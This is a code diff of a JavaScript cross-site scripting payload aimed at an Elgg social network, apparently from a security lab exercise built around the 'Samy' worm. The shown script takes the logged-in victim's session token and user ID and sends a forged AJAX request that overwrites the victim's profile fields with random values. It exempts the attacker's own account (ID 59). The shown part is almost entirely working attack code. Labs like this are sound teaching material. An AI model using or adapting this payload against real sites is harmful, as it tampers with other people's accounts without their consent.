@@ -14,20 +14,21 @@
             randomStrings.push(Math.random().toString(36).substring(7));
         }
         var name = elgg.session.user.name;
+        var samy_id= 59;
         var content = token + ts + '&name=' + name
             + '&description=1905077&accesslevel[description]=1'
             + '&briefdescription=' + randomStrings[0] + '&accesslevel[briefdescription]=1'
             + '&location=' + randomStrings[1] + '&accesslevel[location]=1'
             + '&interests=' + randomStrings[2] + '&accesslevel[interests]=1'
             + '&skills=' + randomStrings[3] + '&accesslevel[skills]=1'
-            + '&contactemail=' + randomStrings[4] + '&accesslevel[contactemail]=1'
+            + '&contactemail=' + randomStrings[4] + '@gmail.com&accesslevel[contactemail]=1'
             + '&phone=' + randomStrings[5] + '&accesslevel[phone]=1'
             + '&mobile=' + randomStrings[6] + '&accesslevel[mobile]=1'
-            + '&website=' + randomStrings[7] + '&accesslevel[website]=1'
+            + '&website=http://www.' + randomStrings[7] + '.com&accesslevel[website]=1'
             + '&twitter=' + randomStrings[8] + '&accesslevel[twitter]=1'
             + '&guid=' + elgg.session.user.guid;
 
-        if (elgg.session.user.guid != 59) {
+        if (elgg.session.user.guid != samy_id) {
             //Create and send Ajax request to modify profile
             var Ajax = null;
             Ajax = new XMLHttpRequest();
